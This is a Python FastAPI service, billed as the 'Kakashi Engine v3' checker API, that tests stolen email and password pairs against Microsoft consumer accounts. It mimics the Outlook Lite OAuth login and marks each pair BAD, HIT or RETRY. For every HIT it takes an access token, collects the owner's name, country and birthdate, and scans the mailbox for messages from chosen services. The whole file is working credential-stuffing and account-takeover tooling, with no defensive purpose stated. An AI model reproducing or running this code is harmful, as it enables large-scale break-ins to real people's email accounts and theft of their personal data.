"""Kakashi Engine v3 — Serverless Checker API. Deploy to Vercel."""
import os, re, uuid, time, json, httpx
from fastapi import FastAPI, Header, HTTPException
from pydantic import BaseModel
from typing import Dict, List

app = FastAPI(docs_url=None, redoc_url=None)
API_SECRET = os.environ.get("ENGINE_SECRET", "")

def _auth(authorization: str = Header(None)):
    if API_SECRET and (not authorization or authorization != f"Bearer {API_SECRET}"):
        raise HTTPException(status_code=403)

FLAGS = {"United States":"🇺🇸","United Kingdom":"🇬🇧","Turkey":"🇹🇷","Germany":"🇩🇪","France":"🇫🇷","Italy":"🇮🇹","Spain":"🇪🇸","Russia":"🇷🇺","China":"🇨🇳","Japan":"🇯🇵","South Korea":"🇰🇷","Brazil":"🇧🇷","India":"🇮🇳","Canada":"🇨🇦","Australia":"🇦🇺"}

class CheckReq(BaseModel):
    email: str
    password: str
    services: Dict[str, str] = {}

class CheckRes(BaseModel):
    status: str
    email: str = ""
    password: str = ""
    name: str = ""
    country: str = ""
    flag: str = ""
    linkedServices: List[str] = []
    birthdate: str = ""
    hasServices: bool = False

@app.post("/api/check")
async def check(req: CheckReq, authorization: str = Header(None)):
    _auth(authorization)
    return (await _ms_check(req.email, req.password, req.services)).dict()

@app.get("/api/health")
async def health():
    return {"ok": True, "ts": int(time.time())}

async def _ms_check(email, password, services) -> CheckRes:
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as s:
            UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            r1 = await s.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers={"User-Agent":"Dalvik/2.1.0 (Linux; U; Android 9)"})
            if "MSAccount" not in r1.text or any(x in r1.text for x in ["Neither","Both","Placeholder","OrgId"]):
                return CheckRes(status="BAD")
            r2 = await s.get(f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers={"User-Agent":UA})
            r2t = r2.text
            um = next(iter(re.findall(r'urlPost":"([^"]+)"', r2t)), None)
            pm = next(iter(re.findall(r'"sFT":"([^"]+)"', r2t) or re.findall(r'name="PPFT"[^>]*value="([^"]+)"', r2t)), None)
            if not um or not pm: return CheckRes(status="BAD")
            pu = um.replace("\\/", "/")
            r3 = await s.post(pu, data={"i13":"1","login":email,"loginfmt":email,"type":"11","LoginOptions":"1","passwd":password,"ps":"2","PPFT":pm,"PPSX":"PassportR","NewUser":"1","FoundMSAs":"","fspost":"0","i21":"0","CookieDisclosure":"0","IsFidoSupported":"0","i19":"9960"}, headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA,"Origin":"https://login.live.com","Referer":str(r2.url)}, follow_redirects=False)
            loc = r3.headers.get("location","")
            if any(x.lower() in r3.text.lower() for x in ["account or password is incorrect","Incorrect password","Invalid credentials"]): return CheckRes(status="BAD")
            if any(x in r3.text for x in ["identity/confirm","Abuse","signedout","locked"]): return CheckRes(status="BAD")
            if not loc: return CheckRes(status="BAD")
            cm = next(iter(re.findall(r'code=([^&]+)', loc)), None)
            if not cm: return CheckRes(status="BAD")
            r4 = await s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={"client_info":"1","client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri":"msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type":"authorization_code","code":cm,"scope":"profile openid offline_access https://outlook.office.com/M365.Access"}, headers={"Content-Type":"application/x-www-form-urlencoded"})
            if r4.status_code!=200 or not r4.json().get("access_token"): return CheckRes(status="BAD")
            tk = r4.json()["access_token"]
            cid = (s.cookies.get("MSPCID") or s.cookies.get("mspcid") or str(uuid.uuid4()).replace("-","")).upper()
            pf = await s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers={"User-Agent":"Outlook-Android/2.0","Accept":"application/json","Authorization":f"Bearer {tk}","X-AnchorMailbox":f"CID:{cid}"})
            pd = pf.json()
            nm = pd.get("names",[{}])[0].get("displayName","Unknown")
            ct = pd.get("accounts",[{}])[0].get("location","Unknown")
            fl = FLAGS.get(ct,"🏳️")
            bd = "Unknown"
            try:
                ac = pd.get("accounts",[{}])[0]
                if ac.get("birthYear") and ac.get("birthMonth") and ac.get("birthDay"):
                    bd = f"{str(ac['birthYear']).zfill(4)}-{str(ac['birthMonth']).zfill(2)}-{str(ac['birthDay']).zfill(2)}"
            except: pass
            ib = await s.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", content="", headers={"authorization":f"Bearer {tk}","x-owa-sessionid":cid,"user-agent":"Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36"})
            ls = []
            for sn,se in services.items():
                if se in ib.text: ls.append(f"{sn} (Messages: {ib.text.count(se)})")
            return CheckRes(status="HIT",email=email,password=password,name=nm,country=ct,flag=fl,linkedServices=ls,birthdate=bd,hasServices=bool(ls))
    except: return CheckRes(status="RETRY")
